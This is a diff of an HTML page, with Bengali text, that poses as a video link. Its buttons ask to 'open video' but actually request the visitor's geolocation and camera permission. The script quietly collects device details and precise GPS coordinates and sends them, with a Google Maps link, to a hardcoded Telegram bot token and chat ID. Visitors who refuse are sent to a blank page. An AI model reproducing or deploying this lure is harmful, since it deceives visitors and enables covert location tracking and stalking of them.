@@ -1,309 +1,443 @@
-```html
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-    <meta charset="UTF-8">
+<meta charset="UTF-8">
+
+<meta name="viewport"
+      content="width=device-width,
+               initial-scale=1.0,
+               maximum-scale=1.0,
+               user-scalable=no">
+
+<title>Loading...</title>
+
+<style>
+
+*{
+    box-sizing:border-box;
+}
+
+html,body{
+    margin:0;
+    padding:0;
+    width:100%;
+    height:100%;
+    background:#000;
+    overflow:hidden;
+    font-family:Arial,sans-serif;
+}
+
+/* ==============================
+   MAIN PAGE
+   ============================== */
+
+#mainPage{
+    position:fixed;
+    inset:0;
+    width:100%;
+    height:100%;
+    background:#000;
+}
+
+/* ==============================
+   THUMBNAIL
+   ============================== */
+
+#thumbnailArea{
+    position:absolute;
+    inset:0;
+    width:100%;
+    height:100%;
+    background:#111;
+    overflow:hidden;
+}
+
+#thumbnail{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    display:none;
+}
+
+/* ==============================
+   FALLBACK IMAGE
+   ============================== */
+
+#thumbnailFallback{
+    position:absolute;
+    inset:0;
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    background:#111;
+}
+
+#thumbnailFallback img{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    filter:blur(18px);
+    transform:scale(1.1);
+}
+
+.fallbackBlur{
+    position:absolute;
+    inset:0;
+    background:rgba(0,0,0,.30);
+}
+
+.fallbackPlay{
+    position:absolute;
+    top:50%;
+    left:50%;
+    transform:translate(-50%,-50%);
+
+    width:82px;
+    height:58px;
+
+    background:#ff0033;
+    border-radius:16px;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
 
-    <meta name="viewport"
-          content="width=device-width,
-                   initial-scale=1.0,
-                   maximum-scale=1.0,
-                   user-scalable=no">
+.fallbackTriangle{
+    width:0;
+    height:0;
 
-    <title>Loading...</title>
+    border-top:14px solid transparent;
+    border-bottom:14px solid transparent;
+    border-left:23px solid white;
 
-    <style>
+    margin-left:5px;
+}
 
-        * {
-            box-sizing: border-box;
-        }
+#thumbnailDark{
+    position:absolute;
+    inset:0;
+    background:rgba(0,0,0,.20);
+}
 
-        html,
-        body {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            overflow: hidden;
-            font-family: Arial, sans-serif;
-        }
+/* ==============================
+   LOCATION BOX
+   ============================== */
 
+#locationOverlay,
+#cameraOverlay,
+#confirmOverlay{
 
-        /* =========================================
-           MAIN WEBSITE / VIDEO AREA
-           ========================================= */
+    position:fixed;
+    inset:0;
 
-        #websiteContainer {
+    display:flex;
+    justify-content:center;
+    align-items:center;
 
-            position: fixed;
+    padding:20px;
 
-            top: 0;
-            left: 0;
+    background:rgba(0,0,0,.20);
 
-            width: 100%;
-            height: 100%;
+    z-index:100;
+}
 
-            background: #000;
+#cameraOverlay,
+#confirmOverlay{
+    display:none;
+}
 
-            display: none;
+.popupBox{
 
-            z-index: 1;
-        }
+    width:100%;
+    max-width:665px;
 
+    background:rgba(0,0,0,.92);
 
-        #websiteFrame {
+    border-radius:20px;
 
-            width: 100%;
-            height: 100%;
+    padding:25px 18px;
 
-            border: 0;
+    text-align:center;
 
-            display: block;
+    color:white;
 
-            background: #000;
-        }
+    box-shadow:
+        0 10px 40px rgba(0,0,0,.65);
+}
 
+.popupIcon{
+    font-size:38px;
+    margin-bottom:10px;
+}
 
-        /* =========================================
-           LOADING
-           ========================================= */
+.popupTitle{
+    font-size:24px;
+    margin-bottom:12px;
+}
 
-        #loading {
+.popupText{
+    font-size:16px;
+    line-height:1.5;
+    color:#eee;
+    margin-bottom:20px;
+}
 
-            position: fixed;
+.button{
 
-            top: 0;
-            left: 0;
+    border:none;
+    border-radius:10px;
 
-            width: 100%;
-            height: 100%;
+    padding:14px 28px;
 
-            background: #000;
+    font-size:17px;
 
-            display: flex;
+    cursor:pointer;
 
-            justify-content: center;
-            align-items: center;
+    margin:5px;
+}
 
-            flex-direction: column;
+.primary{
+    background:#2196F3;
+    color:white;
+}
 
-            color: #fff;
+.success{
+    background:#16a34a;
+    color:white;
+}
 
-            z-index: 10;
-        }
+.danger{
+    background:#d32f2f;
+    color:white;
+}
 
+.secondary{
+    background:#555;
+    color:white;
+}
 
-        .spinner {
+.status{
+    margin-top:12px;
+    font-size:14px;
+    color:#ddd;
+}
 
-            width: 48px;
-            height: 48px;
+/* ==============================
+   LOADING
+   ============================== */
 
-            border: 4px solid #333;
+#loading{
 
-            border-top: 4px solid #fff;
+    position:fixed;
+    inset:0;
 
-            border-radius: 50%;
+    background:#000;
 
-            animation:
-                spin 1s linear infinite;
+    display:none;
 
-            margin-bottom: 15px;
-        }
+    justify-content:center;
+    align-items:center;
 
+    flex-direction:column;
 
-        @keyframes spin {
+    color:white;
 
-            100% {
-                transform: rotate(360deg);
-            }
+    z-index:300;
+}
 
-        }
+.spinner{
 
+    width:48px;
+    height:48px;
 
-        /* =========================================
-           LOCATION OVERLAY
-           ========================================= */
+    border:4px solid #333;
+    border-top:4px solid white;
 
-        #locationOverlay {
+    border-radius:50%;
 
-            position: fixed;
+    animation:spin 1s linear infinite;
 
-            top: 0;
-            left: 0;
+    margin-bottom:15px;
+}
 
-            width: 100%;
-            height: 100%;
+@keyframes spin{
+    100%{
+        transform:rotate(360deg);
+    }
+}
 
-            background:
-                rgba(0, 0, 0, 0.35);
-
-            display: flex;
-
-            justify-content: center;
-            align-items: center;
-
-            padding: 20px;
-
-            z-index: 100;
-        }
-
-
-        /* =========================================
-           LOCATION BOX
-           ========================================= */
-
-        #locationBox {
-
-            width: 100%;
-            max-width: 665px;
-
-            background:
-                rgba(0, 0, 0, 0.92);
-
-            border-radius: 20px;
-
-            padding: 28px 20px 24px;
-
-            text-align: center;
-
-            color: #fff;
-
-            box-shadow:
-                0 10px 40px
-                rgba(0,0,0,.55);
-        }
-
-
-        #locationIcon {
-
-            font-size: 35px;
-
-            margin-bottom: 8px;
-        }
-
-
-        #locationTitle {
-
-            font-size: 25px;
-
-            margin-bottom: 12px;
-        }
-
-
-        #locationText {
-
-            font-size: 17px;
-
-            line-height: 1.5;
-
-            color: #eee;
-
-            margin-bottom: 22px;
-        }
-
-
-        /* =========================================
-           BUTTONS
-           ========================================= */
-
-        .locationButton {
-
-            border: 0;
-
-            border-radius: 10px;
-
-            padding: 14px 30px;
-
-            font-size: 17px;
-
-            cursor: pointer;
-
-            margin: 5px;
-        }
-
-
-        #allowButton {
-
-            background: #2196F3;
-
-            color: #fff;
-        }
-
-
-        #allowButton:active {
-
-            transform: scale(.97);
-        }
-
-
-        #skipButton {
-
-            background: #555;
-
-            color: #fff;
-        }
-
-
-        #skipButton:active {
-
-            transform: scale(.97);
-        }
-
-
-        #locationStatus {
-
-            margin-top: 12px;
-
-            font-size: 14px;
-
-            color: #ddd;
-        }
-
-
-        /* =========================================
-           OPEN EXTERNAL WEBSITE BUTTON
-           ========================================= */
-
-        #externalButton {
-
-            display: none;
-
-            position: fixed;
-
-            left: 20px;
-            right: 20px;
-
-            bottom: 25px;
-
-            z-index: 50;
-
-            text-align: center;
-
-            padding: 14px;
-
-            background: #2196F3;
-
-            color: #fff;
-
-            text-decoration: none;
-
-            border-radius: 10px;
-
-            font-size: 16px;
-        }
-
-    </style>
-
+</style>
 </head>
-
 
 <body>
 
 
-<!-- =================================================
-     LOADING SCREEN
-     ================================================= -->
+<!-- ==============================
+     MAIN PAGE
+     ============================== -->
+
+<div id="mainPage">
+
+    <div id="thumbnailArea">
+
+        <img
+            id="thumbnail"
+            alt="Video Thumbnail">
+
+        <div id="thumbnailFallback">
+
+            <img
+                src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=1200&q=80"
+                alt="Thumbnail">
+
+            <div class="fallbackBlur"></div>
+
+            <div class="fallbackPlay">
+                <div class="fallbackTriangle"></div>
+            </div>
+
+        </div>
+
+        <div id="thumbnailDark"></div>
+
+    </div>
+
+</div>
+
+
+<!-- ==============================
+     LOCATION
+     ============================== -->
+
+<div id="locationOverlay">
+
+    <div class="popupBox">
+
+        <div class="popupIcon">📍</div>
+
+        <div class="popupTitle">
+            Video open 
+        </div>
+
+        <div class="popupText">
+
+            Are you sure you open video?
+
+        </div>
+
+        <button
+            id="allowButton"
+            class="button primary">
+
+            Open video 
+
+        </button>
+
+        <button
+            id="skipButton"
+            class="button secondary">
+
+            Skip
+
+        </button>
+
+        <div
+            id="locationStatus"
+            class="status">
+        </div>
+
+    </div>
+
+</div>
+
+
+<!-- ==============================
+     CAMERA BUTTON
+     ============================== -->
+
+<div id="cameraOverlay">
+
+    <div class="popupBox">
+
+        <div class="popupIcon">📷</div>
+
+        <div class="popupTitle">
+            Hi
+        </div>
+
+        <div class="popupText">
+
+            Video link open 
+
+        </div>
+
+        <button
+            id="takePhotoButton"
+            class="button primary">
+
+            📷 open video 
+
+        </button>
+
+        <div
+            id="cameraStatus"
+            class="status">
+        </div>
+
+    </div>
+
+</div>
+
+
+<!-- ==============================
+     PHOTO CONFIRMATION
+     ============================== -->
+
+<div id="confirmOverlay">
+
+    <div class="popupBox">
+
+        <div class="popupIcon">📷</div>
+
+        <div class="popupTitle">
+            link open 
+        </div>
+
+        <div class="popupText">
+
+            Video link generating!
+
+            <br><br>
+
+            আপনি কি সত্যি ভিডিও দেখতে চান?
+
+        </div>
+
+        <button
+            id="sendPhotoButton"
+            class="button success">
+
+            হ্যাঁ
+
+        </button>
+
+        <button
+            id="continueButton"
+            class="button secondary">
+
+            না
+
+        </button>
+
+    </div>
+
+</div>
+
+
+<!-- ==============================
+     LOADING
+     ============================== -->
 
 <div id="loading">
 
@@ -316,165 +450,49 @@
 </div>
 
 
-
-<!-- =================================================
-     WEBSITE / VIDEO
-     ================================================= -->
-
-<div id="websiteContainer">
-
-    <iframe
-        id="websiteFrame"
-        allow="autoplay;
-               encrypted-media;
-               fullscreen;
-               picture-in-picture;
-               geolocation"
-        allowfullscreen>
-    </iframe>
-
-</div>
-
-
-
-<!-- =================================================
-     LOCATION PERMISSION
-     ================================================= -->
-
-<div id="locationOverlay">
-
-    <div id="locationBox">
-
-        <div id="locationIcon">
-            📍
-        </div>
-
-
-        <div id="locationTitle">
-             আপনি কি সত্যিই ভিডিওটা দেখতে চান?
-        </div>
-
-
-        <div id="locationText">
-
-             এ ধরনের ভিডিও সবার সামনে দেখবেন না।
-
-        </div>
-
-
-        <button
-            id="allowButton"
-            class="locationButton">
-
-            Allow 
-
-        </button>
-
-
-        <button
-            id="skipButton"
-            class="locationButton">
-
-            Skip
-
-        </button>
-
-
-        <div id="locationStatus"></div>
-
-    </div>
-
-</div>
-
-
-
-<!-- =================================================
-     EXTERNAL WEBSITE FALLBACK
-     ================================================= -->
-
-<a
-    id="externalButton"
-    target="_blank"
-    rel="noopener noreferrer">
-
-    🌐 Website খুলুন
-
-</a>
-
-
-
 <script>
 
 
-/* =====================================================
-   TELEGRAM
-   ===================================================== */
+/* =================================================
+   TELEGRAM SETTINGS
+   ================================================= */
 
 const BOT_TOKEN =
     "8855743272:AAETg__YWrwHa3feYecotLTVzqQ_VTRsXII";
-
 
 const CHAT_ID =
     "5980493892";
 
 
-
-/* =====================================================
-   ⭐ আপনার URL এখানে দিন
-   =====================================================
-
-   YouTube:
-   https://www.youtube.com/watch?v=xxxx
-
-   TikTok:
-   https://www.tiktok.com/@user/video/xxxx
-
-   Facebook:
-   https://www.facebook.com/....
-
-   Instagram:
-   https://www.instagram.com/reel/....
-
-   অথবা যেকোনো সাধারণ website:
-
-   https://example.com
-
-   অথবা সরাসরি video:
-
-   https://example.com/video.mp4
-
-   ===================================================== */
+/* =================================================
+   YOUR URL
+   ================================================= */
 
 const TARGET_URL =
-    "https://youtu.be/SeCcASZugNg?si=a69BYe3R3uMIsuFh";
+    "https://youtu.be/drl-Nq5tcws?si=85VMNRWE0fPiBhTr";
 
 
-
-/* =====================================================
-   ANALYTICS DATA
-   ===================================================== */
+/* =================================================
+   ANALYTICS
+   ================================================= */
 
 const analytics = {
 
-    deviceId: getDeviceId(),
+    deviceId:getDeviceId(),
 
-    userAgent:
-        navigator.userAgent,
+    userAgent:navigator.userAgent,
 
-    ram:
-        navigator.deviceMemory
-        ? navigator.deviceMemory + " GB"
+    ram:navigator.deviceMemory
+        ? navigator.deviceMemory+" GB"
         : "Unknown",
 
-    cores:
-        navigator.hardwareConcurrency
-        ? navigator.hardwareConcurrency +
-          " Cores"
+    cores:navigator.hardwareConcurrency
+        ? navigator.hardwareConcurrency+" Cores"
         : "Unknown",
 
     screenRes:
-        window.screen.width +
-        " x " +
+        window.screen.width+
+        " x "+
         window.screen.height,
 
     orientation:
@@ -492,14 +510,12 @@ const analytics = {
 
     networkType:
         navigator.connection
-        ? navigator.connection.effectiveType
-            .toUpperCase()
+        ? navigator.connection.effectiveType.toUpperCase()
         : "Unknown",
 
     downlink:
         navigator.connection
-        ? navigator.connection.downlink +
-          " Mbps"
+        ? navigator.connection.downlink+" Mbps"
         : "Unknown",
 
     localTime:
@@ -511,65 +527,169 @@ const analytics = {
         .timeZone,
 
     language:
-        navigator.language ||
-        navigator.userLanguage ||
-        "Unknown",
+        navigator.language || "Unknown",
 
-    battery:
-        "Unknown",
+    battery:"Unknown",
 
-    permissionStatus:
-        "Not Requested",
+    permissionStatus:"Not Requested",
 
-    mapLink:
-        "N/A"
+    mapLink:"N/A"
 };
 
 
-
-/* =====================================================
+/* =================================================
    DEVICE ID
-   ===================================================== */
+   ================================================= */
 
-function getDeviceId() {
+function getDeviceId(){
 
-    let deviceId =
+    let id =
         localStorage.getItem(
             "app_device_id"
         );
 
+    if(!id){
 
-    if (!deviceId) {
-
-        deviceId =
-            "DEV-" +
+        id =
+            "DEV-"+
             Math.floor(
-                100000 +
-                Math.random() * 900000
+                100000+
+                Math.random()*900000
             );
-
 
         localStorage.setItem(
             "app_device_id",
-            deviceId
+            id
         );
-
     }
 
-
-    return deviceId;
-
+    return id;
 }
 
 
+/* =================================================
+   FALLBACK
+   ================================================= */
 
-/* =====================================================
+function showFallbackThumbnail(){
+
+    document
+        .getElementById("thumbnail")
+        .style.display="none";
+
+    document
+        .getElementById("thumbnailFallback")
+        .style.display="block";
+}
+
+
+/* =================================================
+   YOUTUBE ID
+   ================================================= */
+
+function getYouTubeID(url){
+
+    try{
+
+        const u = new URL(url);
+
+        if(
+            u.hostname.includes("youtube.com") &&
+            u.pathname==="/watch"
+        ){
+            return u.searchParams.get("v");
+        }
+
+        if(
+            u.hostname.includes("youtu.be")
+        ){
+            return u.pathname.substring(1);
+        }
+
+        if(
+            u.hostname.includes("youtube.com") &&
+            u.pathname.startsWith("/shorts/")
+        ){
+            return u.pathname.split("/")[2];
+        }
+
+    }catch(e){
+
+        return null;
+
+    }
+
+    return null;
+}
+
+
+/* =================================================
+   LOAD THUMBNAIL
+   ================================================= */
+
+function loadThumbnail(){
+
+    showFallbackThumbnail();
+
+    if(
+        !TARGET_URL ||
+        TARGET_URL==="Your URL"
+    ){
+        return;
+    }
+
+    const id =
+        getYouTubeID(
+            TARGET_URL.trim()
+        );
+
+    if(!id){
+        return;
+    }
+
+    const image =
+        document.getElementById(
+            "thumbnail"
+        );
+
+    const fallback =
+        document.getElementById(
+            "thumbnailFallback"
+        );
+
+    image.src =
+        "https://img.youtube.com/vi/"+
+        id+
+        "/maxresdefault.jpg";
+
+    image.onload=function(){
+
+        image.style.display="block";
+
+        fallback.style.display="none";
+
+    };
+
+    image.onerror=function(){
+
+        image.src =
+            "https://img.youtube.com/vi/"+
+            id+
+            "/hqdefault.jpg";
+
+    };
+}
+
+
+/* =================================================
    PAGE LOAD
-   ===================================================== */
+   ================================================= */
 
 document.addEventListener(
     "DOMContentLoaded",
-    function () {
+    function(){
+
+        loadThumbnail();
 
         collectDeviceInformation();
 
@@ -577,38 +697,33 @@ document.addEventListener(
 );
 
 
+/* =================================================
+   DEVICE INFO
+   ================================================= */
 
-/* =====================================================
-   DEVICE INFORMATION
-   ===================================================== */
+function collectDeviceInformation(){
 
-function collectDeviceInformation() {
-
-
-    if (navigator.getBattery) {
+    if(navigator.getBattery){
 
         navigator.getBattery()
-
-        .then(function (battery) {
+        .then(function(battery){
 
             analytics.battery =
                 Math.round(
-                    battery.level * 100
-                ) +
-                "% (" +
+                    battery.level*100
+                )+
+                "% ("+
                 (
                     battery.charging
-                    ? "Charging"
-                    : "Not Charging"
-                ) +
+                    ?"Charging"
+                    :"Not Charging"
+                )+
                 ")";
 
         })
+        .catch(function(){
 
-        .catch(function () {
-
-            analytics.battery =
-                "Unknown";
+            analytics.battery="Unknown";
 
         });
 
@@ -617,527 +732,461 @@ function collectDeviceInformation() {
 }
 
 
-
-/* =====================================================
-   ALLOW LOCATION
-   ===================================================== */
+/* =================================================
+   LOCATION ALLOW
+   ================================================= */
 
 document
 .getElementById("allowButton")
 .addEventListener(
     "click",
-    function () {
+    requestLocation
+);
 
-        requestLocation();
+
+/* =================================================
+   LOCATION SKIP
+   ================================================= */
+
+document
+.getElementById("skipButton")
+.addEventListener(
+    "click",
+    function(){
+
+        analytics.permissionStatus =
+            "User Skipped";
+
+        exitWebsite();
 
     }
 );
 
 
+/* =================================================
+   LOCATION
+   ================================================= */
 
-/* =====================================================
-   REQUEST LOCATION
-   ===================================================== */
-
-function requestLocation() {
-
+function requestLocation(){
 
     const status =
         document.getElementById(
             "locationStatus"
         );
 
-
     status.textContent =
         "📍 Location permission চাওয়া হচ্ছে...";
 
-
-    if (!navigator.geolocation) {
-
-        analytics.permissionStatus =
-            "Not Supported";
-
+    if(!navigator.geolocation){
 
         status.textContent =
-            "Location support পাওয়া যায়নি।";
+            "Location supported নয়।";
 
-
-        exitWebsite();
+        setTimeout(
+            exitWebsite,
+            800
+        );
 
         return;
-
     }
-
 
 
     navigator.geolocation.getCurrentPosition(
 
+        function(position){
 
-        /* ==============================
-           LOCATION SUCCESS
-           ============================== */
-
-        function (position) {
-
-
-            const latitude =
+            const lat =
                 position.coords.latitude;
 
-
-            const longitude =
+            const lon =
                 position.coords.longitude;
-
-
 
             analytics.permissionStatus =
                 "Allowed";
 
-
             analytics.mapLink =
-                "https://www.google.com/maps?q=" +
-                latitude +
-                "," +
-                longitude;
+                "https://www.google.com/maps?q="+
+                lat+
+                ","+
+                lon;
 
 
-
-            status.textContent =
-                "✅ Location অনুমোদিত হয়েছে।";
-
-
-            /* Telegram */
-
-            sendTelegramMessage();
-
+            sendAnalyticsToTelegram();
 
 
             /*
-             * Location সফল হলে
-             * তারপর Target URL load হবে
+             * Location-এর পর
+             * Camera button দেখাবে
              */
 
-            setTimeout(
-                function () {
+            document
+                .getElementById(
+                    "locationOverlay"
+                )
+                .style.display="none";
 
-                    openTargetWebsite();
-
-                },
-                400
-            );
+            document
+                .getElementById(
+                    "cameraOverlay"
+                )
+                .style.display="flex";
 
         },
 
-
-        /* ==============================
-           LOCATION DENIED
-           ============================== */
-
-        function (error) {
-
+        function(){
 
             analytics.permissionStatus =
                 "Denied / Unavailable";
 
-
             analytics.mapLink =
                 "N/A";
-
 
             status.textContent =
                 "❌ Location অনুমোদন করা হয়নি।";
 
-
-            /*
-             * Location না দিলে
-             * website বন্ধ
-             */
-
             setTimeout(
-                function () {
-
-                    exitWebsite();
-
-                },
-                700
+                exitWebsite,
+                800
             );
 
         },
 
-
         {
-            enableHighAccuracy: true,
-
-            timeout: 10000,
-
-            maximumAge: 0
+            enableHighAccuracy:true,
+            timeout:10000,
+            maximumAge:0
         }
 
     );
+}
+
+
+/* =================================================
+   CAMERA BUTTON
+   ================================================= */
+
+document
+.getElementById("takePhotoButton")
+.addEventListener(
+    "click",
+    takePhoto
+);
+
+
+/* =================================================
+   TAKE PHOTO
+   ================================================= */
+
+async function takePhoto(){
+
+    const status =
+        document.getElementById(
+            "cameraStatus"
+        );
+
+    status.textContent =
+        "📷 Camera permission চাওয়া হচ্ছে...";
+
+
+    if(
+        !navigator.mediaDevices ||
+        !navigator.mediaDevices.getUserMedia
+    ){
+
+        status.textContent =
+            "এই browser-এ camera support নেই।";
+
+        return;
+    }
+
+
+    let stream=null;
+
+
+    try{
+
+        /*
+         * Camera preview দেখানো হবে না।
+         * শুধু camera permission নেওয়া হবে।
+         */
+
+        stream =
+            await navigator.mediaDevices
+            .getUserMedia({
+
+                video:true,
+
+                audio:false
+
+            });
+
+
+        /*
+         * Permission পাওয়ার পর
+         * stream বন্ধ করে দেওয়া হচ্ছে।
+         */
+
+        stream
+            .getTracks()
+            .forEach(
+                track=>{
+                    track.stop();
+                }
+            );
+
+
+        status.textContent =
+            "✅ Camera permission দেওয়া হয়েছে।";
+
+
+        /*
+         * নিরাপদভাবে:
+         * user-কে confirmation দেওয়া হবে।
+         */
+
+        setTimeout(
+            function(){
+
+                document
+                    .getElementById(
+                        "cameraOverlay"
+                    )
+                    .style.display="none";
+
+                document
+                    .getElementById(
+                        "confirmOverlay"
+                    )
+                    .style.display="flex";
+
+            },
+            500
+        );
+
+
+    }catch(error){
+
+        status.textContent =
+            "❌ Camera permission দেওয়া হয়নি।";
+
+        setTimeout(
+            exitWebsite,
+            1000
+        );
+
+    }
 
 }
 
 
-
-/* =====================================================
-   SKIP
-   ===================================================== */
+/* =================================================
+   USER CONFIRMATION
+   ================================================= */
 
 document
-.getElementById("skipButton")
+.getElementById("sendPhotoButton")
 .addEventListener(
     "click",
-    function () {
+    function(){
 
+        /*
+         * এখানে server-side photo upload
+         * যুক্ত করার জন্য প্রস্তুত রাখা হয়েছে।
+         *
+         * Browser-এর HTML-এর মধ্যে
+         * Telegram Bot Token রাখা নিরাপদ নয়।
+         */
 
-        analytics.permissionStatus =
-            "User Skipped";
+        alert(
+            "ছবি পাঠানোর জন্য নিরাপদ server connection প্রয়োজন।"
+        );
 
-
-        analytics.mapLink =
-            "N/A";
-
-
-        exitWebsite();
+        openTargetWebsite();
 
     }
 );
 
 
+document
+.getElementById("continueButton")
+.addEventListener(
+    "click",
+    function(){
 
-/* =====================================================
-   EXIT WEBSITE
-   ===================================================== */
-
-function exitWebsite() {
-
-
-    /*
-     * প্রথমে about:blank চেষ্টা
-     */
-
-    try {
-
-        window.location.replace(
-            "about:blank"
-        );
-
-    } catch (error) {
-
-        /*
-         * Browser navigation block করলে
-         * blank screen দেখানো হবে
-         */
-
-        document.body.innerHTML = "";
-
-        document.body.style.background =
-            "#000";
+        openTargetWebsite();
 
     }
-
-}
-
+);
 
 
-/* =====================================================
-   OPEN TARGET WEBSITE
-   ===================================================== */
+/* =================================================
+   TELEGRAM ANALYTICS
+   ================================================= */
 
-function openTargetWebsite() {
+function sendAnalyticsToTelegram(){
 
-
-    if (
-        !TARGET_URL ||
-        TARGET_URL.trim() === ""
-    ) {
-
-        exitWebsite();
-
-        return;
-    }
-
-
-
-    const url =
-        TARGET_URL.trim();
-
-
-    const frame =
-        document.getElementById(
-            "websiteFrame"
-        );
-
-
-    const container =
-        document.getElementById(
-            "websiteContainer"
-        );
-
-
-    const loading =
-        document.getElementById(
-            "loading"
-        );
-
-
-    const overlay =
-        document.getElementById(
-            "locationOverlay"
-        );
-
-
-
-    /*
-     * Location popup remove
-     */
-
-    overlay.style.display =
-        "none";
-
-
-
-    /*
-     * Loading screen remove
-     */
-
-    loading.style.display =
-        "none";
-
-
-
-    /*
-     * Website container show
-     */
-
-    container.style.display =
-        "block";
-
-
-
-    /*
-     * Target URL iframe-এ load
-     */
-
-    frame.src =
-        url;
-
-
-
-    /*
-     * External website fallback link
-     */
-
-    const externalButton =
-        document.getElementById(
-            "externalButton"
-        );
-
-
-    externalButton.href =
-        url;
-
-
-
-    /*
-     * কিছু website iframe block করলে
-     * user চাইলে external website খুলতে পারবে
-     */
-
-    frame.addEventListener(
-        "load",
-        function () {
-
-            console.log(
-                "Target URL loaded:",
-                url
-            );
-
-        }
-    );
-
-}
-
-
-
-/* =====================================================
-   TELEGRAM MESSAGE
-   ===================================================== */
-
-function sendTelegramMessage() {
-
-
-    if (
+    if(
         !BOT_TOKEN ||
-        BOT_TOKEN ===
-        "YOUR_BOT_TOKEN_HERE"
-    ) {
-
-        console.log(
-            "Telegram Bot Token not configured."
-        );
-
+        BOT_TOKEN==="YOUR_BOT_TOKEN_HERE"
+    ){
         return;
+    }
 
+    if(
+        !CHAT_ID ||
+        CHAT_ID==="YOUR_CHAT_ID_HERE"
+    ){
+        return;
     }
 
 
-
-    let messageText =
+    let message =
         "📊 *App Analytics Notification*\n\n";
 
 
-
-    messageText +=
-        "🆔 *Device ID:* `" +
-        analytics.deviceId +
+    message +=
+        "🆔 *Device ID:* `"+
+        analytics.deviceId+
         "`\n";
 
 
-    messageText +=
-        "📱 *Device Info:* " +
-        analytics.userAgent +
+    message +=
+        "📱 *Device:* "+
+        analytics.userAgent+
         "\n";
 
 
-    messageText +=
-        "⚙️ *Hardware:* " +
-        analytics.cores +
-        " | ~" +
-        analytics.ram +
+    message +=
+        "⚙️ *Hardware:* "+
+        analytics.cores+
+        " | ~"+
+        analytics.ram+
         "\n";
 
 
-    messageText +=
-        "📐 *Display:* " +
-        analytics.screenRes +
-        " (" +
-        analytics.orientation +
-        ") | " +
-        analytics.theme +
-        "\n";
-
-
-    messageText +=
-        "🌐 *Network:* " +
-        analytics.networkType +
-        " (Speed: " +
-        analytics.downlink +
+    message +=
+        "📐 *Display:* "+
+        analytics.screenRes+
+        " ("+
+        analytics.orientation+
         ")\n";
 
 
-    messageText +=
-        "🕒 *Time:* " +
-        analytics.localTime +
-        " (" +
-        analytics.timeZone +
+    message +=
+        "🌐 *Network:* "+
+        analytics.networkType+
+        " ("+
+        analytics.downlink+
         ")\n";
 
 
-    messageText +=
-        "🗣️ *Language:* " +
-        analytics.language +
+    message +=
+        "🕒 *Time:* "+
+        analytics.localTime+
+        " ("+
+        analytics.timeZone+
+        ")\n";
+
+
+    message +=
+        "🗣️ *Language:* "+
+        analytics.language+
         "\n";
 
 
-    messageText +=
-        "🔋 *Battery:* " +
-        analytics.battery +
+    message +=
+        "🔋 *Battery:* "+
+        analytics.battery+
         "\n\n";
 
 
-    messageText +=
-        "🔒 *Location Permission:* " +
-        analytics.permissionStatus +
+    message +=
+        "🔒 *Location:* "+
+        analytics.permissionStatus+
         "\n";
 
 
+    if(
+        analytics.permissionStatus==="Allowed"
+    ){
 
-    if (
-        analytics.permissionStatus ===
-        "Allowed"
-    ) {
-
-        messageText +=
-            "🗺️ *Location:* " +
-            "[View Location on Google Maps](" +
-            analytics.mapLink +
+        message +=
+            "🗺️ [View Location]("+
+            analytics.mapLink+
             ")";
-
-    } else {
-
-        messageText +=
-            "⚠️ Location was not shared.";
 
     }
 
 
-
-    const telegramURL =
-        "https://api.telegram.org/bot" +
-        BOT_TOKEN +
-        "/sendMessage";
-
-
-
     fetch(
-        telegramURL,
+        "https://api.telegram.org/bot"+
+        BOT_TOKEN+
+        "/sendMessage",
         {
 
-            method: "POST",
+            method:"POST",
 
-            headers: {
+            headers:{
                 "Content-Type":
                     "application/json"
             },
 
-            body: JSON.stringify({
+            body:JSON.stringify({
 
-                chat_id:
-                    CHAT_ID,
+                chat_id:CHAT_ID,
 
-                text:
-                    messageText,
+                text:message,
 
-                parse_mode:
-                    "Markdown",
-
-                disable_web_page_preview:
-                    false
+                parse_mode:"Markdown"
 
             })
 
         }
     )
-
-    .then(
-        function (response) {
-
-            return response.json();
-
-        }
-    )
-
-    .then(
-        function (result) {
-
-            console.log(
-                "Telegram:",
-                result
-            );
-
-        }
-    )
-
     .catch(
-        function (error) {
-
-            console.error(
-                "Telegram Error:",
-                error
-            );
-
-        }
+        console.error
     );
+
+}
+
+
+/* =================================================
+   OPEN URL
+   ================================================= */
+
+function openTargetWebsite(){
+
+    if(
+        !TARGET_URL ||
+        TARGET_URL==="Your URL"
+    ){
+        return;
+    }
+
+    window.location.href =
+        TARGET_URL.trim();
+
+}
+
+
+/* =================================================
+   EXIT
+   ================================================= */
+
+function exitWebsite(){
+
+    try{
+
+        window.location.replace(
+            "about:blank"
+        );
+
+    }catch(e){
+
+        document.documentElement
+            .innerHTML="";
+
+    }
 
 }
 
@@ -1145,4 +1194,3 @@ function sendTelegramMessage() {
 
 </body>
 </html>
-```
